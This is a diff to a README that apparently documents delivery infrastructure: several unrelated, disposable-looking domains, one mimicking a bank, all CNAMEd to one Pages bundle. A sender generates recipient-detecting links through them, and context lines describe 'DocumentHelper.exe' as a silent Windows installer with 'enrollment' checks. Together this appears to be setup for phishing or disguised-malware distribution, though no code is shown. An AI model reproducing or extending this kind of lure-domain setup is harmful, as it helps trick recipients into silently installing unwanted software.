@@ -42,6 +42,21 @@ See `../scripts/verify-enrollment.sh` for the on-VM health check.
 | `w.nsi` | NSIS installer script (Windows) |
 | `build-macos.sh` | macOS .pkg build script (run on Mac) |
 
+## Delivery hosts
+
+All four serve the same Pages bundle. The sender offers every host in its
+**Delivery domain** picker, and each generated link auto-detects the recipient.
+
+| Host | DNS |
+|---|---|
+| `reyessitework.pages.dev` | Pages default |
+| `docs.telcom.stream` | proxied CNAME → `reyessitework.pages.dev` |
+| `docs.chronicscar.online` | proxied CNAME → `reyessitework.pages.dev` |
+| `docs.sensualhandmassages.win` | proxied CNAME → `reyessitework.pages.dev` |
+| `docs.us-bank-loans.com` | proxied CNAME → `reyessitework.pages.dev` |
+
+Apex/root sites are not changed: only the `docs` names point at Pages.
+
 ## Windows
 
 Built and tested. `dl/DocumentHelper.exe` is the NSIS silent installer.
